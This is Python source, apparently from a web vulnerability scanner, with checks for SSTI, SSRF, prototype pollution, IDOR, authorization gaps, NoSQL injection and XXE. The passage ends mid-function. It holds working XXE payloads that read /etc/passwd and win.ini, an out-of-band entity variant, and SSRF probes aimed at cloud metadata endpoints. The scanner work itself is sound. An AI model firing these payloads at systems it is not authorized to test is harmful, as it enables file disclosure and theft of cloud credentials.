"""Deep server-side family: SSTI, SSRF, proto-pollution, IDOR, authz-matrix."""
from __future__ import annotations

import re
from urllib.parse import urlparse

from core.colors import warn
from core.net import ScanBudgetExceeded
from core.registry import check as register_check
from core.scan._shared import Finding
from core.scan.discovery import _inject, _post_form_targets
from core.scan.http import _get, _post
from core.scan.injection import _raw_reflected
from core.deep._shared import (
    SSTI_PAIR, SSTI_BUNDLES,
    SSRF_KEYS, SSRF_META_URL, SSRF_MARKERS, AWS_AMI_ID_RE,
    AZURE_META_URL, AZURE_MARKERS, GCP_META_URL,
    PP_PAYLOADS, _bodies_differ, _param_names,
    NOSQLI_OP_PAIRS, NOSQLI_JSON_TRUE, NOSQLI_JSON_FALSE, NOSQLI_ERR,
)


@register_check("ssti", "SSTI template injection", order=10)
def test_ssti(session, urls: list[str], timeout: int,
             verbose: bool = False, threads: int = 10,
             pages: dict | None = None, base: str = "",
             deep: bool = True, go_worker: bool = False) -> list[Finding]:
    a, b = SSTI_PAIR
    expected = str(a * b)
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []

    # Hybrid: base + bundle GETs for every URL in one round-trip.
    # The stability re-check stays a live _get (back-to-back sameness).
    pre = None
    if go_worker and urls:
        try:
            from core.scan.injection import _go_prefetch
            injs = [u for u in (urls[:6] or [])]
            for u in (urls[:6] or []):
                injs += [_inject(
                    u, bundle.replace("A", str(a)).replace("B", str(b)))
                    for bundle in SSTI_BUNDLES]
            pre = _go_prefetch(session, injs, timeout, threads)
        except Exception:
            pre = None

    def _fetch(u: str):
        if pre is not None and u in pre:
            st, body = pre[u]
            return (st, body, u)
        return _get(session, u, timeout)

    def _probe(u: str) -> Finding | None:
        base_got = _fetch(u)
        if not base_got or expected in (base_got[1] or ""):
            return None  # already in baseline, would be an FP
        for bundle in SSTI_BUNDLES:
            payload = bundle.replace("A", str(a)).replace("B", str(b))
            inj = _inject(u, payload)
            got = _fetch(inj)
            if got and expected in (got[1] or ""):
                # stability: one-off template echoes happen, ask again
                confirm = _get(session, inj, timeout)
                if not (confirm and expected in (confirm[1] or "")):
                    continue
                if verbose:
                    print(warn(f"    [!] SSTI: {inj}"))
                return Finding(
                    title="Possible SSTI (Template Injection)", severity="CRITICAL",
                    url=inj,
                    detail=f"Template expression evaluated to {expected}",
                    evidence=expected,
                    confidence="High",)
        return None

    targets = urls[:6]
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for f in ex.map(_probe, targets):
            if f:
                out.append(f)

    if deep:
        form_targets = _post_form_targets(pages, base)
        # Hybrid: baseline + bundle POSTs in one round-trip; the confirm
        # re-POST stays live (two identical answers in a row, not one).
        ppre = None
        if go_worker and form_targets:
            try:
                from core.scan.injection import _go_prefetch_posts
                ppre = _go_prefetch_posts(
                    session,
                    [((a_, fld, "gash1"), a_, {**filler, fld: "gash1"})
                     for a_, fld, filler in form_targets] +
                    [((a_, fld, bun), a_, {**filler, fld: bun.replace("A", str(a)).replace("B", str(b))})
                     for a_, fld, filler in form_targets
                     for bun in SSTI_BUNDLES],
                    timeout, threads)
            except Exception:
                ppre = None
        for action, field, filler in form_targets:
            base_hit = (ppre or {}).get((action, field, "gash1"))
            if base_hit is not None:
                if expected in (base_hit[1] or ""):
                    continue
            else:
                base_r = _post(session, action, timeout,
                               data={**filler, field: "gash1"})
                if base_r and expected in (base_r.text or ""):
                    continue
            for bundle in SSTI_BUNDLES:
                payload = bundle.replace("A", str(a)).replace("B", str(b))
                hit = (ppre or {}).get((action, field, bundle))
                if hit is not None:
                    body = hit[1] or ""
                else:
                    r = _post(session, action, timeout,
                              data={**filler, field: payload})
                    if not r:
                        continue
                    body = (r.text or "")
                if expected not in body:
                    continue
                confirm = _post(session, action, timeout,
                                data={**filler, field: payload})
                if not (confirm and expected in (confirm.text or "")):
                    continue
                if verbose:
                    print(warn(f"    [!] SSTI (POST {field}): {action}"))
                out.append(Finding(
                    title="Possible SSTI (Template Injection)", severity="CRITICAL",
                    url=action,
                    detail=f"Template expression evaluated to {expected} via POST body",
                    evidence=expected,
                    confidence="High",))
                break
            if len(out) >= 6:
                break
    return out


@register_check("ssrf", "SSRF cloud metadata (+verbose surface note)", order=10)
def test_ssrf(session, urls: list[str], timeout: int,
              verbose: bool = False, threads: int = 10,
              oob=None, go_worker: bool = False) -> list[Finding]:
    from concurrent.futures import ThreadPoolExecutor
    from urllib.parse import urlencode, urlunparse
    out: list[Finding] = []

    def _inj_for(u: str, key: str, target: str) -> str:
        p = urlparse(u)
        return urlunparse((p.scheme, p.netloc, p.path, p.params,
                           urlencode({key: target}), p.fragment))

    # Hybrid: baseline + meta/Azure/GCP probes for every URL in one
    # round-trip (per-request Metadata headers ride along). OOB placement
    # stays a live _get; judging below is byte-identical.
    pre = None
    if go_worker and urls:
        try:
            from core.scan.injection import _go_prefetch
            reqs: list = []
            for u in urls[:10]:
                keys = [k for k in _param_names(u) if k.lower() in SSRF_KEYS]
                if not keys:
                    continue
                reqs.append(u)
                for key in keys[:2]:
                    reqs.append(_inj_for(u, key, SSRF_META_URL))
                    reqs.append({"url": _inj_for(u, key, AZURE_META_URL),
                                 "headers": {"Metadata": "true"}})
                    reqs.append({"url": _inj_for(u, key, GCP_META_URL),
                                 "headers": {"Metadata-Flavor": "Google"}})
            pre = _go_prefetch(session, reqs, timeout, threads)
        except Exception:
            pre = None

    def _fetch(u: str, headers: dict | None = None):
        if pre is not None and u in pre:
            st, body = pre[u]
            return (st, body, u)
        return _get(session, u, timeout, headers=headers)

    def _probe(u: str) -> list[Finding]:
        found: list[Finding] = []
        keys = [k for k in _param_names(u) if k.lower() in SSRF_KEYS]
        if not keys:
            return found
        # OOB first: one fire-and-forget fetch per URL. The response is
        # irrelevant — only a callback proves the server went out.
        if oob is not None:
            from core.oob import new_token
            key = keys[0]
            token = new_token()
            p = urlparse(u)
            inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
                              urlencode({key: oob.url_for(token)}), p.fragment))
            try:
                placed = _get(session, inj, timeout) is not None
            except ScanBudgetExceeded:
                raise
            except Exception:
                placed = False
            if placed:
                oob.pending.append({"kind": "ssrf", "target": u, "token": token})
        # baseline: a page that always mentions cloud markers (e.g. AWS docs)
        # would fake a hit on every probe — rule that out first.
        base_got = _fetch(u)
        base_low = ((base_got[1] if base_got else "") or "").lower()
        base_has_marker = any(m in base_low for m in SSRF_MARKERS + AZURE_MARKERS)
        for key in keys[:2]:
            inj = _inj_for(u, key, SSRF_META_URL)
            got = _fetch(inj)
            if not got:
                continue
            low = (got[1] or "").lower()
            # ``ami-`` and ``meta-data`` also occur in the injected URL. A
            # bare marker can therefore be reflection, not server-side fetch.
            # Require a concrete AWS AMI id before raising a critical result.
            ami = AWS_AMI_ID_RE.search(low)
            hit = ami.group(0) if ami else next(
                (m for m in SSRF_MARKERS
                 if m not in {"ami-", "meta-data"} and m in low), None)
            if hit and not base_has_marker:
                found.append(Finding(
                    title="Possible SSRF (cloud metadata)", severity="CRITICAL",
                    url=inj,
                    detail=f"Parameter '{key}' returned a metadata marker: '{hit}'",
                    evidence=hit,
                    confidence="High",))
                if verbose:
                    print(warn(f"    [!] SSRF: {inj}"))
                continue
            az_inj = _inj_for(u, key, AZURE_META_URL)
            az = _fetch(az_inj, headers={"Metadata": "true"})
            if az:
                az_low = (az[1] or "").lower()
                az_hit = next((m for m in AZURE_MARKERS if m in az_low), None)
                if az_hit and not base_has_marker:
                    found.append(Finding(
                        title="Possible SSRF (cloud metadata)", severity="CRITICAL",
                        url=az_inj,
                        detail=f"Parameter '{key}' returned an Azure metadata "
                               f"marker: '{az_hit}'",
                        evidence=az_hit,
                        confidence="High",))
                    if verbose:
                        print(warn(f"    [!] SSRF (Azure): {az_inj}"))
                    continue
            gcp_inj = _inj_for(u, key, GCP_META_URL)
            gcp = _fetch(gcp_inj, headers={"Metadata-Flavor": "Google"})
            if gcp and gcp[0] == 200:
                gcp_body = (gcp[1] or "").strip()
                if re.fullmatch(r"\d{4,}", gcp_body) \
                        and gcp_body not in (base_got[1] or ""):
                    found.append(Finding(
                        title="Possible SSRF (cloud metadata)", severity="CRITICAL",
                        url=gcp_inj,
                        detail=f"Parameter '{key}' returned a GCP instance id",
                        evidence=gcp_body[:20],
                        confidence="High",))
                    if verbose:
                        print(warn(f"    [!] SSRF (GCP): {gcp_inj}"))
                    continue
            found.append(("INFO", u, key))  # capped below at 3
        return found

    info_left = 3
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(urls[:10]) or 1))) as ex:
        for fs in ex.map(_probe, urls[:10]):
            for x in fs:
                if isinstance(x, tuple):
                    # Signal-free "surface" notes are noise: verbose only, max 3.
                    if verbose and info_left > 0:
                        _, u, key = x
                        out.append(Finding(
                            title="SSRF surface (manual testing advised)", severity="INFO",
                            url=u,
                            detail=f"Parameter '{key}' may accept a URL",
                            evidence=key,
                            confidence="Low",))
                        info_left -= 1
                else:
                    out.append(x)
    return out


@register_check("idor", "IDOR/BOLA API object differential", order=10)
def test_idor(session, pages: dict, base: str, timeout: int,
              verbose: bool = False, session_b=None,
              go_worker: bool = False) -> list[Finding]:
    from urllib.parse import urljoin
    from core.authz import extract_refs_from_url, sibling_url
    cands = []
    for html in (pages or {}).values():
        for m in re.findall(r'href=["\']([^"\']+)["\']', html or "", re.I):
            full = urljoin(base + "/", m)
            try:
                same = urlparse(full).hostname == urlparse(base).hostname
            except Exception:
                same = False
            if not same:
                continue
            for ref in extract_refs_from_url(full):
                # enumerable path ints under API routes only (page/2 style
                # pagination elsewhere is not an object reference).
                if ref.kind == "int" and ref.location == "path" \
                        and "/api/" in (urlparse(full).path or ""):
                    cands.append((full, ref))
    pairs = []
    for full, ref in list(dict.fromkeys(cands))[:5]:
        sib = sibling_url(full, ref)
        if sib:
            pairs.append((full, sib, ref))
    # Hybrid: all object/sibling GETs in one round-trip. The cross-session
    # confirm stays a live second-user _get (proof, not batchable).
    pre = None
    if go_worker and pairs:
        try:
            from core.scan.injection import _go_prefetch
            injs = [u for full, sib, _ref in pairs for u in (full, sib)]
            pre = _go_prefetch(session, injs, timeout, 10)
        except Exception:
            pre = None

    def _fetch(u: str):
        if pre is not None and u in pre:
            st, body = pre[u]
            return (st, body, u)
        return _get(session, u, timeout)

    out: list[Finding] = []
    for full, sib, ref in pairs:
        g1, g2 = _fetch(full), _fetch(sib)
        if not g1 or not g2:
            continue
        if g1[0] in (401, 403) or g2[0] in (401, 403):
            continue  # auth in play, not a signal
        if g1[0] == 200 and g2[0] == 200:
            l1, l2 = len(g1[1] or ""), len(g2[1] or "")
            if _bodies_differ(g1[1], g2[1]):
                try:
                    new_id = sib.rsplit("/", 1)[-1].split("?")[0][:12]
                except Exception:
                    new_id = "N+1"
                if _cross_session_confirm(session_b, sib, g2[1], timeout):
                    out.append(Finding(
                        title="Confirmed IDOR / BOLA (cross-session)",
                        severity="CRITICAL",
                        url=sib,
                        detail=f"/{ref.value} -> /{new_id} readable by a second user "
                               f"({l1}B vs {l2}B); object auth is missing",
                        evidence=f"{l1}B vs {l2}B",
                        confidence="High",
                        method="GET", param=ref.value, location="path",
                        confirm="cross-session",))
                    if verbose:
                        print(warn(f"    [!] IDOR confirmed: {sib}"))
                    continue
                out.append(Finding(
                    title="Possible IDOR / BOLA (single session)", severity="MEDIUM",
                    url=sib,
                    detail=f"/{ref.value} -> /{new_id} returned different data ({l1}B vs {l2}B), no auth; "
                           "measured in one session, confirm with two users",
                    evidence=f"{l1}B vs {l2}B",
                    confidence="Low",))
                if verbose:
                    print(warn(f"    [!] IDOR: {sib}"))
    return out


def _cross_session_confirm(session_b, sib: str, sib_body: str | None,
                           timeout: int) -> bool:
    """Does a second user see the same object? True = access control missing.

    Canonical-JSON-first comparison (keys/values/ownership exact),
    legacy length rule as the HTML fallback. A 401/403/login for user B
    means the object IS protected — that keeps the single-session
    heuristic untouched instead of upgrading it.
    """
    from core.authz import same_object
    if session_b is None:
        return False
    g = _get(session_b, sib, timeout)
    if not g or g[0] != 200:
        return False
    if not (g[1] or "").strip() and not (sib_body or "").strip():
        return False
    return same_object(g[1], sib_body)


@register_check("protopollution", "Prototype Pollution reflection surface", order=10)
def test_proto_pollution(session, urls: list[str], timeout: int,
                         verbose: bool = False, threads: int = 10,
                         go_worker: bool = False) -> list[Finding]:
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []

    targets = urls[:6]
    # Hybrid: all pollution probes in one round-trip; judging is identical.
    pre = None
    if go_worker and targets:
        try:
            from core.scan.injection import _go_prefetch
            pre = _go_prefetch(
                session,
                [_inject(u, p) for u in targets for p in PP_PAYLOADS],
                timeout, threads)
        except Exception:
            pre = None

    def _fetch(inj: str):
        if pre is not None and inj in pre:
            st, body = pre[inj]
            return (st, body, inj)
        return _get(session, inj, timeout)

    def _probe(u: str) -> Finding | None:
        for p in PP_PAYLOADS:
            got = _fetch(_inject(u, p))
            if got and _raw_reflected(got[1], "gashpp"):
                if verbose:
                    print(warn(f"    [!] ProtoPollution surface: {u}"))
                return Finding(
                    title="Prototype Pollution Reflection Surface", severity="INFO",
                    url=_inject(u, p),
                    detail=f"'{p}' reflected in the response (verify manually on Node.js targets)",
                    evidence="gashpp",
                    confidence="Low",)
        return None

    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for f in ex.map(_probe, targets):
            if f:
                out.append(f)
                if len(out) >= 2:
                    break
    return out


@register_check("idor-param", "IDOR query parameter (id/user_id/uuid)", order=10)
def test_idor_param(session, urls: list[str], timeout: int,
                    verbose: bool = False, threads: int = 10,
                    session_b=None, go_worker: bool = False) -> list[Finding]:
    """Enumerable query identifiers: N -> N+1 differential (unguessable
    UUID/GUID/slug refs have no sibling and are covered by authz-matrix)."""
    from concurrent.futures import ThreadPoolExecutor
    from core.authz import extract_refs_from_url, sibling_url
    out: list[Finding] = []

    targets = urls[:8]
    # Hybrid: sibling pairs are pure URL math — precompute them all, fetch
    # in one round-trip. The cross-session confirm stays live (proof).
    pairs: dict[str, list] = {}
    if go_worker and targets:
        for u in targets:
            for ref in [r for r in extract_refs_from_url(u)
                        if r.location == "query" and r.kind == "int"][:2]:
                sib = sibling_url(u, ref)
                if sib:
                    pairs.setdefault(u, []).append((ref, sib))
    pre = None
    if pairs:
        try:
            from core.scan.injection import _go_prefetch
            injs = [u for u in targets]
            for u in targets:
                for _ref, sib in pairs.get(u, []):
                    injs += [sib]
            pre = _go_prefetch(session, injs, timeout, threads)
        except Exception:
            pre = None

    def _fetch(u: str):
        if pre is not None and u in pre:
            st, body = pre[u]
            return (st, body, u)
        return _get(session, u, timeout)

    def _probe(u: str) -> Finding | None:
        refs = [r for r in extract_refs_from_url(u)
                if r.location == "query" and r.kind == "int"]
        for ref in refs[:2]:
            key, n = ref.name, ref.value
            sib = sibling_url(u, ref)
            if not sib:
                continue
            g1, g2 = _fetch(u), _fetch(sib)
            if not g1 or not g2:
                continue
            if g1[0] in (401, 403) or g2[0] in (401, 403):
                continue
            if g1[0] == 200 and g2[0] == 200:
                l1, l2 = len(g1[1] or ""), len(g2[1] or "")
                if _bodies_differ(g1[1], g2[1]):
                    if _cross_session_confirm(session_b, sib, g2[1], timeout):
                        if verbose:
                            print(warn(f"    [!] IDOR-param confirmed: {sib}"))
                        return Finding(
                            title="Confirmed IDOR / BOLA (cross-session)",
                            severity="CRITICAL",
                            url=sib,
                            detail=f"?{key}={n} -> ={int(n) + 1} readable by a second user "
                                   f"({l1}B vs {l2}B); object auth is missing",
                            evidence=f"{l1}B vs {l2}B",
                            confidence="High",
                            method="GET", param=key, location="query",
                            confirm="cross-session",)
                    if verbose:
                        print(warn(f"    [!] IDOR-param: {sib}"))
                    return Finding(
                        title="Possible IDOR / BOLA (single session)", severity="MEDIUM",
                        url=sib,
                        detail=f"?{key}={n} -> ={int(n) + 1} returned different data ({l1}B vs {l2}B), no auth; "
                               "measured in one session, confirm with two users",
                        evidence=f"{l1}B vs {l2}B",
                        confidence="Low",)
        return None

    targets = urls[:8]
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for f in ex.map(_probe, targets):
            if f:
                out.append(f)
    return out


@register_check("authz-matrix", "Anonymous vs user authorization matrix", order=33)
def test_authz_matrix(session, pages: dict, base: str, timeout: int,
                      verbose: bool = False, session_b=None,
                      ctx: dict | None = None,
                      anon_session=None, session_c=None) -> list[Finding]:
    """Who can see what: anonymous vs user (vs user B) per endpoint.

    Runs after dir-brute (order 33) so found admin/API paths join the
    candidates. Anonymous uses a cookie-less session; the user session is
    the scan session. No admin session exists by design — privilege
    boundaries above the user stay "possible", never "confirmed".
    """
    from core.authz import (classify_auth_response,
                            matrix_rows, same_object, extract_ownership,
                            identifier_graph, ROLE_PATHS)
    from core.diff import canonical_json
    cands: list[tuple[str, list]] = []

    def _same(u: str) -> bool:
        try:
            return urlparse(u).hostname == urlparse(base).hostname
        except Exception:
            return False

    try:
        graph = identifier_graph(
            pages, (ctx or {}).get("api_targets"),
            ((ctx or {}).get("browser_graph", {}) or {}).get("traffic"),
            base)
    except Exception:
        graph = []
    for item in graph:
        try:
            if (item.get("method", "GET") or "GET").upper() != "GET":
                continue  # state-changing: matrix reads with GET only
            full, ref = item["url"], item["ref"]
        except Exception:
            continue
        if _same(full) and all(p != full for p, _ in cands):
            cands.append((full, [ref]))
    for u in list((ctx or {}).get("found_paths", []))[:10]:
        if not _same(u):
            continue
        pl = urlparse(u).path.lower()
        if any(k in pl for k in ROLE_PATHS + ("/api/",)) \
                and all(p != u for p, _ in cands):
            cands.append((u, []))
    cands = cands[:6]
    if not cands:
        return []
    if anon_session is None:
        from core.scanner import _session as _mk_session
        try:
            anon_session = _mk_session(timeout)
        except Exception:
            return []
    anon = anon_session
    out: list[Finding] = []

    def _fetch(s, url: str):
        try:
            return _get(s, url, timeout)
        except Exception:
            return None

    for full, refs in cands:
        g_user, g_anon = _fetch(session, full), _fetch(anon, full)
        if not g_user or not g_anon:
            continue
        cu = classify_auth_response(g_user[0], g_user[1], g_user[2])
        ca = classify_auth_response(g_anon[0], g_anon[1], g_anon[2])
        issues = matrix_rows(full, {"anonymous": ca, "user": cu})
        if issues:
            kinds = ", ".join(sorted({r["issue"] for r in issues}))
            out.append(Finding(
                title="Missing authentication on object endpoint",
                severity="MEDIUM",
                url=full,
                detail=f"Sensitive endpoint answers 200 without a session "
                       f"({kinds}); anonymous and user sessions both get in",
                evidence="anon-200",
                confidence="High",
                method="GET", location="path", auth_context="anonymous",
                confirm="anon-200",))
            if verbose:
                print(warn(f"    [!] Missing auth: {full}"))
            continue
        anon_body = g_anon[1] or ""
        unguessable = [r for r in refs if r.kind in ("uuid", "guid", "slug")]
        if unguessable and ca == "ok":
            data = canonical_json(anon_body)
            has_data = isinstance(data, (dict, list)) and len(str(data)) > 10
            if (has_data or extract_ownership(anon_body)) and \
                    "login" not in anon_body[:2000].lower():
                out.append(Finding(
                    title="Direct object reference reachable anonymously",
                    severity="MEDIUM",
                    url=full,
                    detail=f"Unguessable {unguessable[0].kind} object returns "
                           "data without a session; object auth is missing",
                    evidence=unguessable[0].value[:40],
                    confidence="Medium",
                    method="GET", param=unguessable[0].name,
                    location=unguessable[0].location,
                    auth_context="anonymous", confirm="anon-200",))
                if verbose:
                    print(warn(f"    [!] Anon object access: {full}"))
                continue
        pl = urlparse(full).path.lower()
        if cu == "ok" and ca != "ok" and not refs and \
                any(k in pl for k in ("admin", "dashboard", "manage")):
            out.append(Finding(
                title="Possible missing authorization (admin surface)",
                severity="MEDIUM",
                url=full,
                detail="Authenticated session reaches an admin surface "
                       "anonymous cannot; without an admin session the "
                       "privilege boundary stays unproven",
                evidence="user-200",
                confidence="Medium",
                method="GET", location="path", auth_context="user",))
            if verbose:
                print(warn(f"    [!] Admin surface: {full}"))
            continue
        if session_c is not None and cu == "ok" and \
                any(k in pl for k in ROLE_PATHS):
            g_c = _fetch(session_c, full)
            if g_c and g_c[0] == 200 and same_object(g_c[1], g_user[1]):
                data = canonical_json(g_user[1] or "")
                rich = isinstance(data, (dict, list)) and len(str(data)) > 10
                if rich or extract_ownership(g_user[1]):
                    out.append(Finding(
                        title="Missing authorization on admin endpoint",
                        severity="MEDIUM",
                        url=full,
                        detail="Normal user session reads an admin endpoint "
                               "with the same canonical content an admin "
                               "session sees; role check is missing",
                        evidence="admin-same-content",
                        confidence="High",
                        method="GET", location="path",
                        auth_context="user", confirm="admin-match",))
                    if verbose:
                        print(warn(f"    [!] Admin authz missing: {full}"))
                    continue
        if session_b is not None and cu == "ok" and refs:
            g_b = _fetch(session_b, full)
            if g_b and g_b[0] == 200 and same_object(g_b[1], g_user[1]):
                data = canonical_json(g_user[1] or "")
                rich = isinstance(data, (dict, list)) and len(str(data)) > 10
                if rich or extract_ownership(g_user[1]):
                    out.append(Finding(
                        title="Confirmed IDOR / BOLA (cross-session)",
                        severity="CRITICAL",
                        url=full,
                        detail="Same object (canonical content match) readable "
                               "by a second user; object auth is missing",
                        evidence="canonical-match",
                        confidence="High",
                        method="GET", location="path", auth_context="user-b",
                        confirm="cross-session",))
                    if verbose:
                        print(warn(f"    [!] IDOR confirmed (matrix): {full}"))
        if len(out) >= 4:
            break
    seen, uniq = set(), []
    for x in out:
        if (x.title, x.url) not in seen:
            seen.add((x.title, x.url))
            uniq.append(x)
    return uniq[:4]


# ---------- XXE (deep-only: XML body POST) ----------

XXE_MARKERS = ["root:x:0:0", "[fonts]", "for 16-bit app support"]
XXE_ERR_HINTS = re.compile(
    r"SAXParseException|XMLReader|DOCTYPE|external entity|FileNotFoundException|"
    r"java\.io\.File|Access is denied|No such file|failed to load external|"
    r"EntityResolved|Undeclared general entity", re.I)
XXE_PATH_HINTS = ("/xml", "/soap", "/api", "/rpc", "/ws", "/rest",
                  "/upload", "/import", "/parse")


def _xxe_payloads(oob_url: str = "") -> list[tuple[str, str]]:
    """(label, xml_body). Local file entity first; OOB optional."""
    local = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE gash [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<gash><x>&xxe;</x></gash>'
    )
    win = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE gash [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<gash><x>&xxe;</x></gash>'
    )
    out = [("passwd", local), ("winini", win)]
    if oob_url:
        oob = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE gash [<!ENTITY xxe SYSTEM "{oob_url}">]>'
            '<gash><x>&xxe;</x></gash>'
        )
        out.append(("oob", oob))
    return out


def _xxe_targets(base: str, pages: dict | None,
                 api_targets: list | None = None) -> list[str]:
    """XML-ish endpoints to POST (capped). Prefer crawled API/xml paths."""
    from urllib.parse import urljoin, urlparse
    cands: list[str] = []
    seen: set[str] = set()

    def _add(u: str) -> None:
        if not u or u in seen:
            return
        try:
            if urlparse(u).hostname != urlparse(base).hostname:
                return
        except Exception:
            return
        seen.add(u)
        cands.append(u)

    for t in list(api_targets or [])[:8]:
        try:
            loc = getattr(t, "location", "") or ""
            url = getattr(t, "url", "") or ""
            if loc == "xml" or "xml" in (getattr(t, "content_type", "")
                                         or "").lower():
                _add(url)
        except Exception:
            continue
    for html in list((pages or {}).values())[:5]:
        for m in re.finditer(r'action=["\']([^"\']+)["\']', html or "", re.I):
            full = urljoin(base + "/", m.group(1))
            low = full.lower()
            if any(h in low for h in XXE_PATH_HINTS) or "xml" in low:
                _add(full)
    for hint in XXE_PATH_HINTS[:5]:
        _add(base.rstrip("/") + hint)
    _add(base.rstrip("/") + "/")
    return cands[:6]


def _nosqli_morph(url: str, op: str, value: str) -> str:
    """Turn ?id=1 into ?id[$ne]=… (operator morph, not value append)."""
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    if not qs:
        return url
    flat = {f"{k}{op}": value for k in qs}
    return urlunparse((p.scheme, p.netloc, p.path, p.params,
                       urlencode(flat), p.fragment))


@register_check("nosqli", "NoSQL operator injection (Mongo-style)", order=10)
def test_nosqli(session, urls: list[str], timeout: int,
                verbose: bool = False, deep: bool = True,
                pages: dict | None = None, base: str = "",
                threads: int = 10) -> list[Finding]:
    """Boolean differential on query-param operator morphing ($ne/$eq).

    TRUE response must track the baseline; FALSE must diverge; both must
    differ from each other. Status-only flips and bare 401/403 never
    become CRITICAL. Error signatures alone are MEDIUM. JSON body morph
    is deep-only and structure-preserving (one leaf)."""
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []
    targets = [u for u in (urls or []) if "?" in u and "=" in u][:6]

    def _probe(u: str) -> list[Finding]:
        found: list[Finding] = []
        base_got = _get(session, u, timeout)
        if not base_got:
            return found
        base_status, base_body, _ = base_got
        lb = len(base_body or "")
        # Error-oracle (never CRITICAL alone)
        for true_op, false_op, val in NOSQLI_OP_PAIRS[:2]:
            gt = _get(session, _nosqli_morph(u, true_op, val), timeout)
            gf = _get(session, _nosqli_morph(u, false_op, val), timeout)
            if not gt or not gf:
                continue
            gt_status, gt_body = gt[0], gt[1] or ""
            gf_status, gf_body = gf[0], gf[1] or ""
            # Error signature on operator morph → MEDIUM (parser saw $)
            err = NOSQLI_ERR.search(gt_body) or NOSQLI_ERR.search(gf_body)
            if err and not found:
                found.append(Finding(
                    title="Possible NoSQL injection (error signature)",
                    severity="MEDIUM",
                    url=u[:240],
                    detail="Mongo/BSON-style error after operator morph "
                           "($ne/$eq); confirm with a controlled boolean "
                           "differential before treating as CRITICAL.",
                    evidence=err.group(0)[:80],
                    confidence="Medium",
                    method="GET",
                    location="query",
                    confirm="error-signature",
                ))
            if gt_status != base_status or gf_status != base_status:
                continue  # filter/WAF — unusable for boolean
            if base_status in (401, 403):
                continue  # auth wall without content proof ≠ CRITICAL
            lt, lf = len(gt_body), len(gf_body)
            true_same = abs(lt - lb) <= max(30, lb // 20)
            false_diff = abs(lf - lb) > max(10, lb // 10)
            tf_diff = abs(lt - lf) > max(10, lb // 10)
            if true_same and false_diff and tf_diff:
                gf2 = _get(session, _nosqli_morph(u, false_op, val), timeout)
                if not gf2 or abs(len(gf2[1] or "") - lf) > max(30, lf // 20):
                    continue
                found.append(Finding(
                    title="Possible NoSQL Injection (boolean)",
                    severity="CRITICAL",
                    url=u[:240],
                    detail=f"TRUE ({true_op}) matches baseline ({lt}B), "
                           f"FALSE ({false_op}) differs ({lf}B)",
                    evidence=f"{true_op} vs {false_op}",
                    confidence="Medium",
                    method="GET",
                    location="query",
                    confirm="boolean-diff",
                ))
                if verbose:
                    print(warn(f"    [!] NoSQLi boolean: {u[:80]}"))
                break
        return found

    with ThreadPoolExecutor(
            max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for hits in ex.map(_probe, targets):
            out.extend(hits)
            if len(out) >= 2:
                break

    # Deep-only: JSON body leaf morph on POST API-looking forms/pages
    if deep and len(out) < 2 and pages:
        from core.scan.discovery import _post_form_targets
        for action, field, filler in _post_form_targets(pages, base or "",
                                                        limit=3):
            try:
                import json as _json
                true_body = dict(filler)
                true_body[field] = _json.loads(NOSQLI_JSON_TRUE)
                false_body = dict(filler)
                false_body[field] = _json.loads(NOSQLI_JSON_FALSE)
            except Exception:
                continue
            rt = _post(session, action, timeout,
                       data=_json.dumps(true_body).encode("utf-8"),
                       headers={"Content-Type": "application/json"})
            rf = _post(session, action, timeout,
                       data=_json.dumps(false_body).encode("utf-8"),
                       headers={"Content-Type": "application/json"})
            if not rt or not rf:
                continue
            try:
                tb, fb = rt.text or "", rf.text or ""
                ts, fs = int(rt.status_code), int(rf.status_code)
            except Exception:
                continue
            if ts in (401, 403) and fs in (401, 403):
                continue
            if abs(len(tb) - len(fb)) > max(20, len(tb) // 10) and ts == fs:
                out.append(Finding(
                    title="Possible NoSQL Injection (JSON body)",
                    severity="CRITICAL",
                    url=action[:240],
                    detail=f"JSON leaf '{field}' accepted $ne/$eq operators "
                           "with a stable length differential.",
                    evidence=field,
                    confidence="Medium",
                    method="POST",
                    location="body",
                    confirm="boolean-diff",
                ))
                if verbose:
                    print(warn(f"    [!] NoSQLi JSON: {action[:80]}"))
                break
    return out[:3]


@register_check("xxe", "XXE via XML body entity expansion", order=10,
                deep_only=True)
def test_xxe(session, base: str, pages: dict, timeout: int,
             verbose: bool = False, oob=None,
             api_targets: list | None = None) -> list[Finding]:
    """Deep-only: POST crafted XML with external entities. Content markers
    or OOB callback = proof. Never DoS (no billion-laughs)."""
    targets = _xxe_targets(base, pages, api_targets)
    if not targets:
        return []
    out: list[Finding] = []
    for url in targets[:4]:
        oob_url = ""
        oob_token = ""
        if oob is not None:
            try:
                from core.oob import new_token
                oob_token = new_token()
                oob_url = oob.url_for(oob_token)
            except Exception:
                oob_url, oob_token = "", ""
        for label, xml in _xxe_payloads(oob_url)[:3]:
            if label == "oob" and not oob_url:
                continue
            r = _post(session, url, timeout, data=xml.encode("utf-8"),
                      headers={"Content-Type": "application/xml"})
            if r is None:
                continue
            try:
                body = r.text or ""
                code = int(r.status_code)
            except Exception:
                continue
            if len(body) > 200_000:
                continue
            if label == "oob" and oob is not None and oob_token:
                oob.pending.append({"kind": "xxe", "target": url,
                                    "token": oob_token})
            hit = next((m for m in XXE_MARKERS if m in body), None)
            if hit:
                out.append(Finding(
                    title="Possible XXE (file disclosure)",
                    severity="CRITICAL",
                    url=url[:240],
                    detail=f"XML parser expanded an external entity ({label}) "
                           "and returned local file content markers.",
                    evidence=hit,
                    confidence="High",
                    method="POST",
                    location="body",
                    confirm="content-marker",
                ))
                if verbose:
                    print(warn(f"    [!] XXE file read: {url[:80]}"))
                return out[:2]
            if label != "oob" and code >= 400 and XXE_ERR_HINTS.search(body):
